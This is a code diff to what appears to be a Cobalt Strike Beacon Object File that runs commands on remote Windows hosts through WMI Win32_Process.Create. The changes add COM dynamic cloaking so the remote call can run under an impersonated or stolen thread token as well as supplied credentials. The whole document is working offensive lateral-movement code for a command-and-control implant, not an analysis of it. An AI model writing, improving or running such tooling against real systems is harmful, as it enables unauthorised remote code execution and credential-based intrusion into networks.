@@ -23,21 +23,61 @@ extern "C" {
 	void go(char* buff, int len);
 
 	DECLSPEC_IMPORT 	HRESULT  WINAPI		OLE32$CLSIDFromString(wchar_t* lpsz, LPCLSID pclsid);
-	DECLSPEC_IMPORT	        HRESULT  WINAPI	 	OLE32$CoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID* ppv);
+	DECLSPEC_IMPORT	    HRESULT  WINAPI	 	OLE32$CoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID* ppv);
 	DECLSPEC_IMPORT 	HRESULT  WINAPI		OLE32$CoInitializeEx(LPVOID, DWORD);
+	DECLSPEC_IMPORT 	HRESULT  WINAPI		OLE32$CoInitializeSecurity(PSECURITY_DESCRIPTOR pSecDesc, LONG cAuthSvc, SOLE_AUTHENTICATION_SERVICE *asAuthSvc, void *pReserved1, DWORD dwAuthnLevel, DWORD dwImpLevel, void *pAuthList, DWORD dwCapabilities, void *pReserved3);
 	DECLSPEC_IMPORT 	VOID     WINAPI		OLE32$CoUninitialize();
 	DECLSPEC_IMPORT 	HRESULT  WINAPI		OLE32$IIDFromString(wchar_t* lpsz, LPIID lpiid);
 	DECLSPEC_IMPORT 	HRESULT  WINAPI	 	OLE32$CoSetProxyBlanket(IUnknown* pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc, OLECHAR* pServerPrincName, DWORD dwAuthnLevel, DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo, DWORD dwCapabilities);
 	DECLSPEC_IMPORT 	VOID     WINAPI		OLEAUT32$VariantInit(VARIANTARG *pvarg);
-	DECLSPEC_IMPORT	        HRESULT  WINAPI 	OLEAUT32$VariantClear(VARIANTARG *pvarg);
+	DECLSPEC_IMPORT	    HRESULT  WINAPI 	OLEAUT32$VariantClear(VARIANTARG *pvarg);
 	DECLSPEC_IMPORT 	BSTR     WINAPI		OLEAUT32$SysAllocString(const OLECHAR *);
-	DECLSPEC_IMPORT         VOID     WINAPI         OLEAUT32$SysFreeString(BSTR bstrString);
+	DECLSPEC_IMPORT     VOID     WINAPI         OLEAUT32$SysFreeString(BSTR bstrString);
 	DECLSPEC_IMPORT 	WINBASEAPI void * WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
 	DECLSPEC_IMPORT 	WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
+	DECLSPEC_IMPORT 	WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentThread();
+	DECLSPEC_IMPORT 	WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
+	DECLSPEC_IMPORT 	WINBASEAPI BOOL WINAPI ADVAPI32$OpenThreadToken(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
 	DECLSPEC_IMPORT 	WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t *_Str);
 	DECLSPEC_IMPORT 	int      WINAPI		MSVCRT$swprintf(wchar_t* buffer, const wchar_t* format, ...);
 	
 	}
+
+/* COM ignores the thread impersonation token unless cloaking is set.
+ * Cloaking cannot be combined with an explicit COAUTHIDENTITY. */
+static HRESULT SetProxySecurity(IUnknown* punk, COAUTHIDENTITY* authidentity, int IsCurrent)
+{
+	DWORD caps = (IsCurrent == 1) ? EOAC_DYNAMIC_CLOAKING : EOAC_NONE;
+	RPC_AUTH_IDENTITY_HANDLE auth = (IsCurrent == 1) ? NULL : (RPC_AUTH_IDENTITY_HANDLE)authidentity;
+
+	if (!punk)
+		return E_POINTER;
+
+	return OLE32$CoSetProxyBlanket(
+		punk,
+		RPC_C_AUTHN_WINNT,
+		RPC_C_AUTHZ_NONE,
+		NULL,
+		RPC_C_AUTHN_LEVEL_CALL,
+		RPC_C_IMP_LEVEL_IMPERSONATE,
+		auth,
+		caps);
+}
+
+static HRESULT SetProxySecurityWithUnk(IUnknown* punk, COAUTHIDENTITY* authidentity, int IsCurrent, IID* iidUnk)
+{
+	IUnknown* pUnk = NULL;
+	HRESULT hr = SetProxySecurity(punk, authidentity, IsCurrent);
+
+	if (FAILED(hr))
+		return hr;
+
+	if (iidUnk && SUCCEEDED(punk->QueryInterface(*iidUnk, (void**)&pUnk)) && pUnk) {
+		SetProxySecurity(pUnk, authidentity, IsCurrent);
+		pUnk->Release();
+	}
+	return hr;
+}
 
 // Handle Cred material
 
@@ -58,7 +98,7 @@ void CreateCreds(COAUTHINFO** authInfo, COAUTHIDENTITY** authidentity, wchar_t* 
 	}
 
 	/* Use embedded identity only for alternate creds. When IsCurrent==1 the
-	 * process token is used; pAuthIdentityData must be NULL in that case. */
+	 * thread token (or process token) is used; pAuthIdentityData must be NULL. */
 	if (IsCurrent == 1)
 	{
 		id = NULL;
@@ -141,14 +181,19 @@ void go(char* buff, int len) {
 		IsCurrent = 0;
 		BeaconPrintf(CALLBACK_OUTPUT, "Using supplied credentials\n");
 	} else {
-		BeaconPrintf(CALLBACK_OUTPUT, "Using current context\n");
+		HANDLE hTok = NULL;
+		if (ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_QUERY, TRUE, &hTok)) {
+			BeaconPrintf(CALLBACK_OUTPUT, "Using impersonated token\n");
+			KERNEL32$CloseHandle(hTok);
+		} else {
+			BeaconPrintf(CALLBACK_OUTPUT, "Using current context\n");
+		}
 	}
 
 	BeaconPrintf(CALLBACK_OUTPUT, "Command: %ls\n", bwcommandline);
 
 	CreateCreds(&authInfo, &authidentity, bwusername, bwpassword, bwdomain, IsCurrent);
 
-	// Doesnt currently work but should let you use current context
 	if (IsCurrent == 1)
 	{
 		authidentity = NULL;
@@ -160,6 +205,12 @@ void go(char* buff, int len) {
 				BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx failed: 0x%08lx", hr);
 				return;
 		}
+	}
+
+	/* Cloaking makes ConnectServer / DCOM use the thread token when present. */
+	hr = OLE32$CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING, NULL);
+	if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
+		BeaconPrintf(CALLBACK_ERROR, "CoInitializeSecurity failed: 0x%08lx", hr);
 	}
 
 	hr = OLE32$CoCreateInstance(Cwbm, 0, CLSCTX_INPROC_SERVER, Iwbm, (void**)&locator);
@@ -196,8 +247,12 @@ void go(char* buff, int len) {
 	}
 
 
-	hr = OLE32$CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, authidentity, EOAC_NONE);
+	wchar_t* Iunkstr = OLEAUT32$SysAllocString(L"{00000000-0000-0000-C000-000000000046}");
+	IID Iunk;
+	OLE32$IIDFromString(Iunkstr, &Iunk);
+	OLEAUT32$SysFreeString(Iunkstr);
 
+	hr = SetProxySecurityWithUnk(pSvc, authidentity, IsCurrent, &Iunk);
 	if (!SUCCEEDED(hr)) {
 		BeaconPrintf(CALLBACK_ERROR, "CoSetProxyBlanket failed: 0x%08x", hr);
 		return;
@@ -214,6 +269,7 @@ void go(char* buff, int len) {
 		BeaconPrintf(CALLBACK_ERROR, "GetObject failed: 0x%08x", hr);
 		return;
 	}
+	SetProxySecurity(pClass, authidentity, IsCurrent);
 
 	//pInParamsDefinition will receive the paramters signature for the Win32_Process.Create(...) method. We should fill these params and call the method
 	//We cannot ignore this step because the "Put" method later on will check for the parameter names.
@@ -239,6 +295,7 @@ void go(char* buff, int len) {
 		BeaconPrintf(CALLBACK_ERROR, "GetObject2 failed: 0x%08x", hr);
 		return;
 	}
+	SetProxySecurity(pStartupObject, authidentity, IsCurrent);
 
 	hr = pStartupObject->SpawnInstance(0, &pStartupInstance); //Create an instance of Win32_ProcessStartup
 
